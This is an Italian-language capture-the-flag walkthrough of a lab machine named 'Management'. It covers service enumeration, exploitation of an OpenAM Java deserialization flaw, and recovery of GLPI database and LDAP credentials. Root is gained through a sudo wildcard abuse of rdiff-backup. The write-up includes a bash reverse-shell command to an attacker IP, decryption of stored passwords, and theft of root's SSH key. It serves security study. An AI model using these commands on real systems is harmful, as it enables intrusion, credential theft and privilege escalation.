# Management

ip vittima: 10.129.78.40
ip attaccante: 10.10.15.73

## Prima enumerazione: ricerca di tutte le porte TCP

La prima operazione consiste nel capire quali servizi sono raggiungibili sulla macchina.

Abbiamo utilizzato Nmap:

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.78.40 -oG porte
```

Analizziamo le opzioni.

```
-p-             scansiona tutte le 65535 porte TCP
--open          mostra solamente le porte aperte
-sS             esegue una SYN Scan
--min-rate 5000 cerca di inviare almeno 5000 pacchetti al secondo
-vvv            output molto dettagliato
-n              non esegue risoluzioni DNS
-Pn             considera l'host attivo senza effettuare prima un ping
-oG porte       salva il risultato nel file "porte"
```

La SYN Scan è una delle tecniche più comuni per individuare rapidamente le porte TCP aperte senza completare per ogni porta l'intero handshake TCP.

Il risultato importante è stato:

```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
443/tcp   open  https   syn-ack ttl 63
1689/tcp  open  firefox syn-ack ttl 63
4444/tcp  open  krb524  syn-ack ttl 63
34695/tcp open  unknown syn-ack ttl 63
50389/tcp open  unknown syn-ack ttl 63
```

Nmap, in questa prima fase, prova ad associare i numeri di porta a servizi noti utilizzando principalmente la propria tabella interna. Per questo motivo le identificazioni `firefox` e `krb524` non devono essere considerate affidabili.

Abbiamo quindi trovato **sette porte TCP aperte**:

```
22
80
443
1689
4444
34695
50389
```

La prima scansione ci dice quindi **dove guardare**, ma non ancora con precisione **quali software stanno realmente ascoltando su quelle porte**.
## Identificazione dei servizi

Effettuiamo una seconda scansione soltanto sulle porte appena trovate:

```
sudo nmap -sC -sV -O -p22,80,443,1689,4444,34695,50389 10.129.78.40 -oN servizi
```

Le nuove opzioni sono:

```
-sC    esegue gli script NSE standard di Nmap
-sV    tenta di identificare servizio e versione
-O     prova a identificare il sistema operativo
-oN    salva l'output in formato normale nel file "servizi"
```

Questa volta il risultato è molto più informativo.

```
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
1689/tcp  open  java-rmi Java RMI
4444/tcp  open  ssl/ldap
34695/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
```

Ci sono immediatamente alcune informazioni interessanti.

La porta `22` espone:

```
OpenSSH 9.6p1 Ubuntu
```

quindi sappiamo che la macchina è quasi certamente Linux/Ubuntu.

Le porte `80` e `443` utilizzano:

```
nginx 1.24.0 (Ubuntu)
```

Abbiamo quindi un'applicazione web da enumerare.

Inoltre troviamo:

```
1689   Java RMI
34695  Java RMI
4444   SSL/LDAP
50389  LDAP (Anonymous bind OK)
```

La presenza contemporanea di **Java RMI** e **LDAP** è già un'indicazione interessante: sulla macchina gira chiaramente un'applicazione Java con un directory service.

Per il foothold, tuttavia, iniziamo dall'applicazione web, che è la superficie più immediatamente accessibile.
## Nmap rivela il dominio `management.htb`

L'output della porta 80 contiene:

```
http-title: Did not follow redirect to https://management.htb/
```

Questa informazione è molto importante.

Quando abbiamo interrogato il server tramite il suo IP, Nginx ha risposto dicendoci che il sito corretto utilizza il nome:

```
management.htb
```

Anche il certificato HTTPS della porta 443 conferma la stessa cosa:

```
Subject: commonName=management.htb
```

e soprattutto:

```
Subject Alternative Name:
DNS:management.htb
DNS:*.management.htb
```

Quest'ultima riga ci fornisce due informazioni:

```
management.htb
*.management.htb
```

Il wildcard:

```
*.management.htb
```

indica che potrebbero esistere **sottodomini**, ad esempio:

```
qualcosa.management.htb
```
## Aggiunta del dominio a `/etc/hosts`

Il dominio `.htb` non è un normale dominio Internet e generalmente il nostro DNS non sa come risolverlo.

Dobbiamo quindi dire manualmente al nostro sistema che:

```
management.htb = 10.129.78.40
```

Modifichiamo:

```
sudo nano /etc/hosts
```

e aggiungiamo:

```
10.129.78.40 management.htb
```

Salviamo il file.
## Prima visita del sito

Possiamo verificare rapidamente il server tramite `curl`:

```
curl -kI https://management.htb/
```

`curl` è un client HTTP da terminale.

L'opzione:

```
-I
```

mostra principalmente gli header HTTP.

L'opzione:

```
-k
```

dice a `curl` di non bloccare la connessione in caso di certificato TLS non riconosciuto dal sistema. Nei laboratori HTB è molto comune utilizzare certificati self-signed.

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 28 Sep 2026 20:03:00 GMT
Content-Type: text/html
Content-Length: 2360
Last-Modified: Tue, 02 Jun 2026 01:21:44 GMT
Connection: keep-alive
ETag: "6a1e3028-938"
Accept-Ranges: bytes
```

Aprendo nel browser:

```
https://management.htb/
```

troviamo il sito **Management — Managed IT & Infrastructure**.

Non emerge però immediatamente una funzionalità utile per ottenere accesso alla macchina.
## Perché cerchiamo sottodomini

Ricordiamo il certificato trovato da Nmap:

```
DNS:management.htb
DNS:*.management.htb
```

Quel wildcard ci suggerisce esplicitamente che potrebbero esserci servizi ospitati su altri hostname.

Un server web può infatti servire applicazioni completamente diverse sulla stessa porta a seconda del valore dell'header HTTP.
Ad esempio:

```
Host: management.htb
```

potrebbe mostrare un sito, mentre:

```
Host: <subdomain>.management.htb
```

potrebbe mostrarne un altro.

Questa tecnica prende il nome di **Virtual Host enumeration**.
## Enumerazione dei virtual host

Possiamo utilizzare `ffuf` in questo modo:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://10.129.78.40/ -H "Host: FUZZ.management.htb" -k -ac
```

Qui:

```
FUZZ
```

viene sostituito da ogni parola della wordlist.

Per esempio ffuf proverà richieste equivalenti a:

```
Host: admin.management.htb
Host: dev.management.htb
Host: test.management.htb
Host: sso.management.htb
...
```

`-k` ignora gli errori TLS, mentre `-ac` tenta di calibrare automaticamente le risposte false positive.

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.78.40/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.management.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

sso                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 28ms]
:: Progress: [20000/20000] :: Job [1/1] :: 1754 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

L'hostname interessante che emerge è:

```
sso.management.htb
```

`SSO` significa **Single Sign-On**, cioè un servizio centralizzato di autenticazione.
## Aggiunta di `sso.management.htb`

Modifichiamo nuovamente:

```
sudo nano /etc/hosts
```

e trasformiamo la nostra riga in:

```
10.129.78.40 management.htb sso.management.htb
```
## Analisi del servizio SSO

Interroghiamo il nuovo virtual host:

```
curl -kI https://sso.management.htb/
```

Visitandolo anche da browser:

```
https://sso.management.htb/
```

veniamo rediretti verso:

```
https://sso.management.htb/openam/
```

Questo ci rivela immediatamente il software utilizzato:

```
OpenAM
```

OpenAM è una piattaforma di **Identity and Access Management**, cioè un sistema che gestisce autenticazione, utenti, sessioni e Single Sign-On.

Questa scoperta si collega molto bene anche alle porte precedentemente individuate:

```
Java RMI
LDAP
```

perché OpenAM è un'applicazione Java e utilizza un directory service LDAP.
## Enumerazione iniziale di OpenAM

Possiamo controllare direttamente la pagina di login:

```
curl -ks https://sso.management.htb/openam/UI/Login
```

Qui:

```
-s
```

significa silent, quindi `curl` non mostra la progress bar.

Per cercare nell'HTML stringhe potenzialmente interessanti abbiamo utilizzato:

```
curl -ks https://sso.management.htb/openam/UI/Login | grep -Ei 'openam|forgerock|version|copyright|jato'
```

`grep` cerca determinate parole all'interno dell'output.

Abbiamo controllato anche alcuni endpoint informativi di OpenAM:

```
curl -k -i -H 'Accept-API-Version: resource=1.1' 'https://sso.management.htb/openam/json/serverinfo/*'
```

e:

```
curl -ks https://sso.management.htb/openam/base/Version
```

Questi test ci aiutano a confermare struttura e comportamento dell'installazione, ma l'indizio più chiaro sulla versione arriva dall'interfaccia web.
## Identificazione della versione di OpenAM

Apriamo:

```
https://sso.management.htb/openam/
```

che rimanda a:

```
https://sso.management.htb/openam/XUI/#login/
```

Poi apriamo gli strumenti per sviluppatori con:

```
F12
```

selezioniamo:

```
Network
```

e ricarichiamo la pagina.

Cliccando sulle varie richieste vediamo nei relativi headers che OpenAM carica numerose risorse dalla directory:

```
/openam/XUI/
```

Osservando le richieste troviamo URL come:

```
/openam/XUI/partials/login/_Choice.html?v=16.0.5
/openam/XUI/partials/login/_Default.html?v=16.0.5
/openam/XUI/partials/login/_Password.html?v=16.0.5
/openam/XUI/templates/common/LoginBaseTemplate.html?v=16.0.5
/openam/XUI/org/forgerock/commons/ui/common/components/LoginHeader.js?v=16.0.5
```

Tutti contengono:

```
?v=16.0.5
```

Il dato interessante è quindi:

```
16.0.5
```

Possiamo ragionevolmente identificare l'installazione come:

```
OpenAM 16.0.5
```

Questa informazione cambia radicalmente l'enumerazione.

Non stiamo più cercando genericamente problemi su un sito web: ora conosciamo **prodotto e versione**.
## Ricerca di vulnerabilità note

Una volta identificato:

```
OpenAM 16.0.5
```

abbiamo cercato vulnerabilità note relative a questa versione.

La vulnerabilità interessante è:

```
CVE-2026-33439
```

Utilizziamo questo Proof of Concept 

https://github.com/infernosalex/CVE-2026-33439-Python-PoC

che utilizza una vecchia componente OpenAM basata su JATO.

In particolare, il PoC indica l'endpoint:

```
/openam/ui/PWResetUserValidation
```

e il parametro:

```
jato.clientSession
```
## Verifica dell'endpoint vulnerabile

Prima di eseguire l'exploit è sempre utile verificare che la risorsa indicata dal PoC esista realmente.

Abbiamo quindi eseguito:

```
curl -k -I https://sso.management.htb/openam/ui/PWResetUserValidation
```

La richiesta restituisce:

```
HTTP/1.1 200
```

Questo significa che l'endpoint è presente.

La pagina viene quindi effettivamente gestita dall'installazione OpenAM della macchina.
## Verifica del parametro `jato.clientSession`

Il PoC utilizza:

```
jato.clientSession
```

come parametro vulnerabile.

Prima di inviare un payload Java vero, abbiamo effettuato una richiesta di prova utilizzando un valore palesemente non valido:

```
AAAA
```

Il comando è:

```
curl -k 'https://sso.management.htb/openam/ui/PWResetUserValidation?jato.clientSession=AAAA'
```

L'applicazione processa comunque la richiesta.

Abbiamo quindi confermato che sulla macchina esistono tutti gli elementi necessari:

```
OpenAM 16.0.5
/openam/ui/PWResetUserValidation
jato.clientSession
```
## Cosa sfrutta la CVE

La vulnerabilità riguarda la **deserializzazione Java**.

La serializzazione permette a Java di trasformare un oggetto in una sequenza di byte in modo da poterlo memorizzare o trasmettere.

Il problema nasce quando un'applicazione accetta da un utente dati serializzati e li ricostruisce senza controllare adeguatamente cosa contengono.

In forma molto semplificata:

```
attaccante
   ↓
oggetto Java malevolo
   ↓
jato.clientSession
   ↓
OpenAM deserializza l'oggetto
   ↓
viene attivata una gadget chain
   ↓
esecuzione di un comando Linux
```

L'impatto è quindi una:

```
Remote Code Execution
```

abbreviata:

```
RCE
```

cioè la possibilità di eseguire comandi sulla macchina remota.
## Invio della reverse shell

Utilizziamo il POC scaricato da GitHub usando questa reverse shell Bash:

```
bash -c 'bash -i >& /dev/tcp/10.10.15.73/4444 0>&1'
```

e la passiamo all'exploit:

```
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "bash -c 'bash -i >& /dev/tcp/10.10.15.73/4444 0>&1'"
```

Nel terminale in cui siamo in ascolto con:

```
nc -lvnp 4444
```

arriva la connessione. Abbiamo ottenuto una shell. La stabilizziamo con:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Identificazione dell'utente compromesso

La prima cosa da fare dentro una nuova shell è capire **chi siamo**.

Eseguiamo:

```
id
```

Il risultato è:

```
uid=996(openam) gid=987(openam) groups=987(openam)
```

Quindi abbiamo ottenuto accesso come:

```
openam
```

Possiamo verificarlo anche con:

```
whoami
```

che restituisce:

```
openam
```

Il nome della macchina:

```
hostname
```

restituisce:

```
management
```

Possiamo infine controllare sistema e kernel:

```
uname -a
```

La macchina è Ubuntu Linux.
## Enumerazione degli utenti locali

La prima cosa da fare è controllare quali utenti del sistema dispongono di una vera shell.

Possiamo utilizzare:

```
getent passwd | grep -E '/bin/(bash|sh)$'
```

Tra gli account presenti troviamo:

```
root:x:0:0:root:/root:/bin/bash
owen:x:1000:1000:Owen Castellan:/home/owen:/bin/bash
```

L'utente interessante è quindi:

```
owen
```

con home directory:

```
/home/owen
```

Verifichiamo i permessi:

```
ls -ld /home /home/owen
```

```
drwxr-xr-x 3 root root 4096 Sep  7 11:41 /home
drwxr-x--- 3 owen owen 4096 Sep  7 11:41 /home/owen
```

La directory di Owen non è direttamente accessibile dall'utente `openam`.
Dobbiamo quindi trovare delle credenziali.
## Enumerazione delle applicazioni installate

Una posizione molto comune per applicazioni installate manualmente è:

```
/opt
```

Controlliamo il contenuto:

```
ls -la /opt
```

Tra le directory troviamo:

```
/opt/glpi
/opt/openam
/opt/openam-tomcat
```

La presenza di:

```
/opt/glpi
```

è interessante.

**GLPI** è una piattaforma web per la gestione dell'infrastruttura IT e normalmente utilizza un database MySQL/MariaDB contenente configurazioni, utenti, autenticazioni esterne e credenziali applicative.
## Enumerazione manuale della configurazione GLPI

Entriamo nella directory:

```
cd /opt/glpi
```

e controlliamo il contenuto:

```
ls -la
```

Tra le directory troviamo:

```
config
```

Esaminiamola:

```
ls -la /opt/glpi/config
```

Tra i file presenti risultano particolarmente interessanti:

```
config_db.php
glpicrypt.key
```

Il primo nome suggerisce chiaramente una configurazione del database.

Leggiamolo:

```
cat /opt/glpi/config/config_db.php
```

Nel file troviamo le credenziali utilizzate da GLPI per collegarsi al database locale:

```
host:     127.0.0.1
user:     glpi
password: 8rhu0L6Pw4Y7
database: glpidb
```

Abbiamo quindi recuperato credenziali valide per MySQL/MariaDB.
## Accesso al database GLPI

Possiamo collegarci direttamente al database:

```
mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb
```

Oppure possiamo eseguire direttamente query dalla shell utilizzando l'opzione `-e`.

Per prima cosa possiamo verificare le tabelle disponibili:

```
SHOW TABLES;
```

GLPI contiene moltissime tabelle, quindi invece di analizzarle una alla volta possiamo cercare quelle collegate a sistemi di autenticazione esterni.

Dato che sulla macchina avevamo già individuato servizi LDAP durante l'enumerazione iniziale, cerchiamo le tabelle che contengono la parola `ldap`:

```
SHOW TABLES LIKE '%ldap%';
```

Otteniamo:

```
+---------------------------+
| Tables_in_glpidb (%ldap%) |
+---------------------------+
| glpi_authldapreplicates   |
| glpi_authldaps            |
+---------------------------+
```

La tabella:

```
glpi_authldaps
```

è particolarmente interessante perché contiene le configurazioni dei server LDAP utilizzati da GLPI.
## Lettura della configurazione LDAP

Visualizziamo completamente il contenuto della tabella:

```
SELECT * FROM glpi_authldaps\G
```

Otteniamo una configurazione chiamata:

```
Management Directory
```

con i parametri principali:

```
host:     sso.management.htb
basedn:   dc=management,dc=htb
rootdn:   cn=svc-glpi,ou=services,dc=management,dc=htb
port:     389
use_bind: 1
```

Il campo più importante è:

```
rootdn_passwd:
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

Quindi GLPI utilizza l'account di servizio LDAP:

```
cn=svc-glpi,ou=services,dc=management,dc=htb
```

e memorizza la relativa password nel campo:

```
rootdn_passwd
```

Il valore però non è in chiaro: è cifrato.
## Individuazione della chiave di cifratura

Durante l'esplorazione di:

```
ls -la /opt/glpi/config
```

avevamo già notato:

```
glpicrypt.key
```

Questo suggerisce che GLPI utilizzi quella chiave per cifrare le credenziali sensibili memorizzate nel database.
Invece di cercare di indovinare l'algoritmo, possiamo analizzare direttamente il codice PHP di GLPI.
## Ricerca della funzione di decrittazione

Cerchiamo riferimenti a:

```
glpicrypt.key
decrypt
GLPIKey
```

nel codice sorgente:

```
grep -RniE 'class GLPIKey|function decrypt|glpicrypt\.key' /opt/glpi/src /opt/glpi/inc 2>/dev/null | head -40
```

Otteniamo:

```
/opt/glpi/src/Glpi/Altcha/AltchaManager.php:189: ...
/opt/glpi/src/Glpi/Application/View/Extension/SecurityExtension.php:68:    public function decrypt($value): string
/opt/glpi/src/GLPIKey.php:51:class GLPIKey
/opt/glpi/src/GLPIKey.php:103:        $this->keyfile = $config_dir . '/glpicrypt.key';
/opt/glpi/src/GLPIKey.php:462:    public function decrypt(?string $string, ?string $key = null): ?string
/opt/glpi/src/GLPIKey.php:525:    public function decryptUsingLegacyKey(...)
```

Il file fondamentale è quindi:

```
/opt/glpi/src/GLPIKey.php
```
## Decrittazione della password LDAP

Non è necessario scrivere manualmente un algoritmo di decrittazione.

Possiamo caricare direttamente le librerie di GLPI da PHP e utilizzare la sua stessa classe `GLPIKey`.

Eseguiamo:

```
php -r "define('GLPI_CONFIG_DIR','/opt/glpi/config'); require '/opt/glpi/vendor/autoload.php'; \$k=new GLPIKey('/opt/glpi/config'); echo \$k->decrypt('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==').PHP_EOL;"
```

Vediamo cosa fa il comando.

La parte:

```
define('GLPI_CONFIG_DIR','/opt/glpi/config');
```

indica a GLPI la posizione della configurazione.

Successivamente:

```
require '/opt/glpi/vendor/autoload.php';
```

carica automaticamente le classi PHP utilizzate dall'applicazione.

Creiamo quindi un oggetto:

```
$k = new GLPIKey('/opt/glpi/config');
```

che utilizza:

```
/opt/glpi/config/glpicrypt.key
```

Infine:

```
$k->decrypt(...)
```

decifra il valore contenuto in `rootdn_passwd`.

Il risultato del comando è la **password in chiaro dell'account LDAP `svc-glpi`**.

```
WpczC40GhTbk
```
## Password reuse verso l'utente locale `owen`

Ora abbiamo:

```
account LDAP: svc-glpi
password: WpczC40GhTbk
```

Ma durante l'enumerazione iniziale degli utenti avevamo individuato anche:

```
owen
```

Una verifica comune durante un penetration test consiste nel controllare se una password recuperata da un servizio viene riutilizzata anche per un account locale.

Dato che SSH è in ascolto sulla porta 22, proviamo direttamente:

```
ssh owen@127.0.0.1
```

Alla richiesta:

```
owen@127.0.0.1's password:
```

inseriamo:

```
WpczC40GhTbk
```

L'autenticazione ha successo.

Otteniamo quindi una vera sessione SSH:

```
owen@management:~$
```

Il movimento laterale è riuscito.
## Recupero della User Flag

Entriamo nella home di Owen:

```
cd ~
```

Visualizziamo i file:

```
ls -la
```

Tra i file presenti troviamo:

```
user.txt
```

Leggiamo quindi la flag:

```
cat user.txt
```

Otteniamo così la **User Flag**.

Il punto centrale della compromissione è quindi la combinazione di tre elementi presenti sulla stessa macchina: **le credenziali MySQL di GLPI**, **la password LDAP cifrata memorizzata in `glpi_authldaps`** e **la chiave `glpicrypt.key` insieme alla classe `GLPIKey` capace di decifrarla**. La password recuperata viene infine riutilizzata dall'utente locale `owen`, consentendo l'accesso SSH e il recupero della user flag.
## Privilege Escalation da `owen` a `root`

Dopo aver ottenuto una shell SSH come utente `owen`, il passo successivo è verificare quali comandi può eseguire con `sudo`.

Eseguiamo:

```
sudo -l
```

L'output mostra:

```
Matching Defaults entries for owen on management:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```

Questa regola permette a `owen` di eseguire `rdiff-backup` come `root` senza password, a condizione che il comando inizi con:

```
/usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only
```

Il dettaglio importante è il carattere:

```
*
```

alla fine della regola.

Questo significa che possiamo aggiungere ulteriori argomenti dopo quelli imposti da `sudoers`.
## Verifica della versione di `rdiff-backup`

Controlliamo la versione installata:

```
/usr/bin/rdiff-backup --version
```

Output:

```
rdiff-backup 2.2.6
```

Controlliamo quindi le opzioni disponibili per la modalità server:

```
/usr/bin/rdiff-backup server --help
```

Otteniamo:

```
usage: rdiff-backup server [-h] [--restrict-path DIR_PATH]
                           [--restrict-mode {read-write,read-only,update-only}]
                           [--debug]

Start rdiff-backup in server mode (only meant for internal use).

options:
  -h, --help
  --restrict-path DIR_PATH
  --restrict-mode {read-write,read-only,update-only}
  --debug
```

Le opzioni:

```
--restrict-path
--restrict-mode
```

possono quindi essere fornite direttamente al processo server.

La regola `sudo` impone:

```
--restrict-path /opt/backup
--restrict-mode read-only
```

ma possiamo aggiungere successivamente gli stessi parametri con valori diversi.
## Sovrascrittura delle restrizioni

Possiamo quindi costruire il comando server così:

```
--restrict-path /opt/backup
--restrict-mode read-only
--restrict-path /
--restrict-mode read-write
```

Poiché le opzioni vengono ripetute, `rdiff-backup` utilizza i valori specificati successivamente.

Di fatto trasformiamo:

```
restrict-path = /opt/backup
restrict-mode = read-only
```

in:

```
restrict-path = /
restrict-mode = read-write
```

Il processo continua comunque a essere eseguito come:

```
root
```

perché viene avviato tramite `sudo`.
## Utilizzo di `--remote-schema`

Per sfruttare il server privilegiato utilizziamo `rdiff-backup` lato client.

L'opzione:

```
--remote-schema
```

permette di specificare quale comando deve essere utilizzato per avviare il server remoto.

Normalmente `rdiff-backup` utilizzerebbe SSH, ma possiamo sostituire il comando remoto con quello autorizzato tramite `sudo`.

Prepariamo una directory locale:

```
mkdir -p /tmp/rdifftest
```

Poi eseguiamo:

```
rdiff-backup --remote-schema '{h}' backup 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write'::/root /tmp/rdifftest
```

Qui la sorgente remota è:

```
/root
```

mentre la destinazione locale è:

```
/tmp/rdifftest
```

Il comando specificato attraverso `--remote-schema` avvia invece:

```
sudo /usr/bin/rdiff-backup \
--server \
--restrict-path /opt/backup \
--restrict-mode read-only \
--restrict-path / \
--restrict-mode read-write
```

come `root`.

Il server `rdiff-backup` può quindi accedere all'intero filesystem.
## Accesso ai file di `/root`

Terminato il backup, controlliamo il contenuto:

```
ls -la /tmp/rdifftest
```

Otteniamo, tra gli altri:

```
.bash_history
.bashrc
.cache
.config
.local
.profile
rdiff-backup-data
root.txt
.ssh
```

Questo conferma che siamo riusciti a copiare il contenuto di:

```
/root
```

nonostante la regola `sudo` originale prevedesse:

```
--restrict-path /opt/backup
```

Abbiamo quindi ottenuto **lettura arbitraria dei file di root** tra cui la **root flag**
## Individuazione delle chiavi SSH di root

Tra i file copiati troviamo:

```
/tmp/rdifftest/.ssh
```

Controlliamo il contenuto:

```
ls -la /tmp/rdifftest/.ssh
```

Output:

```
authorized_keys
id_ed25519
id_ed25519.pub
```

Il file più importante è:

```
id_ed25519
```

che è la chiave SSH privata di `root`.

Possiamo verificarla:

```
head -5 /tmp/rdifftest/.ssh/id_ed25519
```

L'inizio del file è:

```
-----BEGIN OPENSSH PRIVATE KEY-----
```

La chiave pubblica corrispondente è:

```
cat /tmp/rdifftest/.ssh/id_ed25519.pub
```

e termina con:

```
root@management
```

Inoltre la stessa chiave pubblica è presente in:

```
authorized_keys
```

Questo significa che la chiave privata recuperata è autorizzata per l'accesso SSH come `root`.
## Preparazione della chiave privata

SSH rifiuta normalmente chiavi private con permessi troppo permissivi.

Impostiamo quindi:

```
chmod 600 /tmp/rdifftest/.ssh/id_ed25519
```
## Accesso SSH come root

Possiamo ora utilizzare direttamente la chiave privata:

```
ssh -i /tmp/rdifftest/.ssh/id_ed25519 -o IdentitiesOnly=yes root@127.0.0.1
```

L'autenticazione ha successo e otteniamo:

```
root@management:~#
```

La privilege escalation è completata.
## Recupero della Root Flag

Una volta ottenuta la shell root:

```
cat /root/root.txt
```

otteniamo la **Root Flag**.

Il punto decisivo della scalata è la configurazione `sudoers`: il wildcard finale consente di aggiungere nuovi argomenti a `rdiff-backup`, permettendo di ripetere `--restrict-path` e `--restrict-mode` e sostituire di fatto le restrizioni originarie. Questo consente a un processo `rdiff-backup` eseguito come `root` di leggere `/root`. Dal backup viene recuperata la chiave SSH privata di root, che permette infine di autenticarsi direttamente come `root`.
